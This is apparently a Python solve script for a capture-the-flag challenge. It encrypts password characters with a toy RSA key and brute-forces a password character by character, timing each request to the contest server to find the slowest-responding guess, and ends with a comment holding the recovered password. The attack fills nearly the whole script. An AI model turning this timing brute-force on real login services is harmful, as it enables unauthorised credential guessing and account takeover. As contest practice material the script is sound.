import requests
import time


p = 3217
q = 6451
e = 17

N = p * q
phi = (p - 1) * (q - 1)
d = 4880753

def encryptRSA(m):
    return pow(m, e, N)

def submit(pwd):
    arr = []
    for i in range(len(pwd)):
        arr.append(encryptRSA(ord(pwd[i])))
    return ",".join(map(str, arr))

assert submit("12345678") == "8272582,17059160,20555739,5510519,9465679,18442920,18644618,3444445"

url = "http://litctf.live:31776/verify?password="
base = "CxIj6"
import string
alphabet = string.ascii_letters + string.digits
while True:
    m = 0
    mi = 0    
    for letter in alphabet:
        password = base + letter
        password = password.ljust(6, "_")
        
        payload = submit(password)
        # print(url + payload)

        then = time.time()
        r = requests.get(url + payload, allow_redirects=False)
        # print(url + payload)
        now = time.time()

        print(password, round(now - then, 2))
        # print(now - then, i)
        # print(r.text)
        if now - then > m:
            m = now - then
            mi = letter

        # fail is r.status_code == 302
        print(r.status_code)
        if r.status_code == 200:
            print("Found:", password)
            exit()
        # print(i)
        # print()
    print(m, mi)
    base += mi

#CxIj6p